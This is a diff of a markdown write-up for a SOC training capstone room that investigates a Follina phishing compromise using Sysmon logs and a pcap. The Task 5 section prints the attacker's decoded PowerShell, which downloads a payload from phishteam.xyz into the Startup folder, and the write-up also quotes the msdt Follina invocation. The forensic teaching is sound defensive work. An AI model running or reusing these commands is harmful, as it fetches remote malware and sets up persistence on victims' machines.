@@ -19,6 +19,8 @@
 
 [Conclusions and Learning Outcomes](#conclusion-and-learning-outcomes)
 
+___
+
 ## Introduction
 
 This room is a capstone challenge for the SOC 1 learning path. 
@@ -34,12 +36,14 @@ Tools used in this task:
 
 The instructions do suggest using Brim occasionally but I never had to.
 
+___
+
 ### Task 3: Preparation - Tools and Artifacts
-This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView
+This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView.
 
 <img width="1080" height="594" alt="image" src="https://github.com/user-attachments/assets/3b9ae910-d797-4b8f-9efb-5ca1fa8c3810" />
 
-The task also asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`
+The task also asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`.
 
 <img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />
 
@@ -52,6 +56,8 @@ The task also asks us to find the SHA256 hashes of the incident files. This is d
 
 **What is the SHA256 hash of the windows.evtx file?**
 > D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
+
+___
 
 ### Task 4: Initial Access - Malicious Document
 We are investigating a CRITICAL severity alert. The analyst who escalated this alert has gathered some information for us:
@@ -71,6 +77,8 @@ Additionally, the tasks has some notes for us:
 > free_magicules.doc
 
 Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.
+
+<img width="849" height="749" alt="image" src="https://github.com/user-attachments/assets/60e3458e-b0fd-4230-bd8c-55a3c800f634" />
 
 **What is the name of the compromised user and machine?**
 
@@ -98,7 +106,6 @@ Looking at the DNS query events (Event ID 22) just before the malicious file was
 
 To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string.
 
-
 **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
 
 *Format: XXXX-XXXXX*
@@ -106,15 +113,22 @@ To find this, we filter for events with ParentProcessID matching the PID of the 
 
 I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190.
 
+___
+
 ### Task 5: Initial Access - Stage 2 execution
 Now we can decode the base64, and look at the commands that it executes:
+
 `$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`
 
 Line by line:
 `$app=[Environment]::GetFolderPath('ApplicationData')`: Set the AppData folder path to $app
+
 `cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"`: Change working directory to the Startup folder
+
 `iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip`: iwr is an alias for Invoke-WebRequest. This line downloads a payload from the same malicious domain we saw earlier
+
 `Expand-Archive .\update.zip -DestinationPath .`: Extracts the contents of the zip file payload that was just downloaded
+
 `rm update.zip`: Deletes the zip file
 
 This set of commands downloads a zip file to the Startup folder, extracts it, and then deletes the original archive, leaving the extracted file in the Startup folder.
@@ -157,6 +171,8 @@ For this task I used SysmonView. Selecting first.exe makes it easy to see the ne
 
 <img width="469" height="765" alt="image" src="https://github.com/user-attachments/assets/f99ae9b2-dd23-46b4-9252-01d1203c94b8" />
 
+___
+
 ### Task 6: Initial Access - Malicious Document Traffic
 We are now tasked with looking into the pcap file. We have the malicious domain and IP that we found in the last task.
 The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier.
@@ -194,6 +210,8 @@ The next 3 questions all have to do with what is shown in the last image.
 > nim
 
 The user agent is: `Nim httpclient/1.6.6`
+
+___
 
 ### Task 7: Discovery - Internal Reconnaissance
 
@@ -244,6 +262,8 @@ Searching for the hash on VirusTotal shows a malicious file. The Names section g
 
 This is the service associated with the port we found earlier that could provide a remote shell.
 
+___
+
 ### Task 8: Privilege Escalation - Exploiting Privileges
 We know that the attacker has gained a stable shell through a reverse socks proxy.
 The task tells us to look for these events:
@@ -289,6 +309,8 @@ This information is found in the event we saw earlier where `spf.exe` was used t
 > 8080
 
 Filtering the events for Network Connections (Event ID 3), and looking for events that happened shortly after when `spf.exe` was used to run `final.exe`, we can see multiple connections to `167.71.222.162`, all connecting to port `8080`.
+
+___
 
 ### Task 9: Actions on Objective - Fully-owned Machine
 Our last task is to find all of the persistence techniques that the attacker used. It also tells us that the unusual executions are related to the malicious C2 binary used during privilege escalation (`final.exe`).
@@ -344,6 +366,8 @@ Looking at the Windows Event Logs at the time that the command found in the last
 This command can be found by filtering for events with `final.exe` as their parent process
 
 <img width="1085" height="446" alt="image" src="https://github.com/user-attachments/assets/39ec94ca-3f8c-4abf-b3e0-7fb3c1b7a3a3" />
+
+___
 
 ## Conclusion and Learning Outcomes
 
